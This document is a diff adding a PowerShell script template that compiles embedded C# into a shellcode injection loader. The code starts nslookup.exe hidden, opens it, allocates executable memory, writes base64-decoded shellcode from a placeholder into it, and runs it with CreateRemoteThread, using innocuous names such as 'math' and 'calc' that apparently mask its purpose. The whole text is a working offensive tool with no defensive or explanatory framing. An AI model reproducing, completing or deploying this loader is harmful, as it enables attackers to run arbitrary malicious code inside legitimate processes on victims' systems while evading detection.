@@ -1,0 +1,123 @@
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public class {class}
+{
+     static string math = @"{shellcode}";
+
+    static int pid = Process.GetCurrentProcess().Id;
+
+    public static void Main(string[] args)
+    {
+        //startproc("C:\\Windows\\SysWOW64\\nslookup.exe");
+        startproc("C:\\Windows\\system32\\nslookup.exe");
+        String procname = "nslookup";
+        Process targetProcess;
+
+        try
+        {
+            targetProcess = Process.GetProcessesByName(procname)[0];
+            pid = targetProcess.Id;
+        }
+        catch
+        {
+            System.Console.WriteLine("Process " + procname + " not found!");
+        }
+
+
+
+        calc(math, pid);
+
+
+    }
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
+        uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
+        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    const int PROCESS_CREATE_THREAD = 0x0002;
+    const int PROCESS_QUERY_INFORMATION = 0x0400;
+    const int PROCESS_VM_OPERATION = 0x0008;
+    const int PROCESS_VM_WRITE = 0x0020;
+    const int PROCESS_VM_READ = 0x0010;
+
+
+    const uint MEM_COMMIT = 0x00001000;
+    const uint MEM_RESERVE = 0x00002000;
+    const uint PAGE_READWRITE = 4;
+    const uint PAGE_EXECUTE_READWRITE = 0x40;
+
+    public static int calc(string scode, int procPID)
+    {
+
+        Process targetProcess = Process.GetProcessById(procPID);
+
+
+        string s;
+        s = scode;
+
+        byte[] math = Convert.FromBase64String(s);
+
+
+        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
+
+        IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)math.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+        UIntPtr bytesWritten;
+        WriteProcessMemory(procHandle, allocMemAddress, math, (uint)math.Length, out bytesWritten);
+
+        CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
+        Console.Write("thread created");
+        return 0;
+    }
+
+    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
+    public static extern bool IsWow64Process(System.IntPtr hProcess, out bool lpSystemInfo);
+
+    public static bool IsWow64Process(Process process)
+    {
+        bool retVal = false;
+        IsWow64Process(process.Handle, out retVal);
+        return retVal;
+    }
+
+    public static bool startproc(String procpath)
+    {
+        Process process = new Process();
+
+
+        process.StartInfo.RedirectStandardOutput = true;
+        process.StartInfo.UseShellExecute = false;
+        process.StartInfo.CreateNoWindow = true;
+
+
+        process.StartInfo.FileName = procpath;
+        process.StartInfo.Arguments = "";
+
+
+        process.Start();
+        return true;
+    }
+}
+
+"@
+
+[{class}]::Main("test2")
